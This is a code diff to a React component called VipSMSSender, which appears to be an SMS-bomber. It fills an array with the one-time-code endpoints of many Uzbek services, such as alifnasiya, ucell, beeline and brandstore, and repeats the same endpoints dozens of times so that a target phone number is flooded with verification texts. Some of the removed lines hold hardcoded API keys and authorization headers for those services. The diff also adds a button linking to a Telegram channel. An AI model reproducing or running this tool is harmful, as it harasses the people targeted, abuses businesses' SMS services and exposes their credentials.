@@ -197,24 +197,24 @@ function VipSMSSender() {
         url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
         body: { phone: `+${phone}` },
       },
-      
-      
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+
 
       { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
-      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
-      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
-      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
-      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
-
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      
+    
       { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
       { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
       { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
@@ -249,53 +249,6 @@ function VipSMSSender() {
       },
          
       
-      
-
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
-      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
-      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
-      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
-      { url: 'https://back.asakabank.uz/core/v1/get-in-touch-create', body: { name: "Name", phone, type: 1 } },
-      { url: 'https://silkroad.ox-sys.com/market-api/sent-verification', body: { phoneNumber: `+${phone}` }, headers: { 'security-key': 'NFfZU_xXfo9D4DMAOrCDLiJ-qufE2jb1aH6YRqYlQ2g=' } },
-      { url: 'https://api.7saber.uz/client/sms/send', body: { phone: `+${phone}` }, headers: { 'Authorization': 'Basic Kzk5ODkwMTIzNDU2NzpkY2QwNTRjZjJlYjM5NjIyODQxNGZmMDZmZGQ0MTA4NQ==' } },
-      { url: 'https://customer.api.delever.uz/v1/customers/login', body: { phone: `+${phone}` }, headers: { 'Shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76' } },
-      { url: 'https://api.allgood.uz/auth/send-otp', body: { phone: `+${phone}` }, headers: { 'deviceid': '6c10c22247c90dc53e3f62f8efe9eddb', 'devicetype': 'WEB' } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: 'register' } },
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone } },
-      { url: 'https://evsapi.ectn.uz/service/client-auth', body: { phone, lang: 'en' } },
-      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {} },
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
-
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-
-
-      
-
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
-      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
-      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
-
       {
         url: "https://api.brandstore.uz/api/auth/code/create",
         body: { phone },
@@ -348,18 +301,296 @@ function VipSMSSender() {
       },
       
 
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
-      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
-      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
 
       
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+         
+
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
       
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+      
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+      
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+      
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+
+
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      
+    
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+
+
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+    
+
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+         
+      
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      
+
       {
         url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
         body: { phone },
@@ -439,6 +670,11 @@ function VipSMSSender() {
     }).format(date);
   };
 
+    const handleAdminClick = () => {
+        
+    window.location.href = "https://t.me/tohirjonov_channel";
+  };
+
 
   return (
     <div className="container">
@@ -504,6 +740,7 @@ function VipSMSSender() {
             </>
           )}
         </button>
+        <button className="button vip-button" onClick={handleAdminClick}>Telegram kanal🌐</button>
       </div>
     </div>
   );
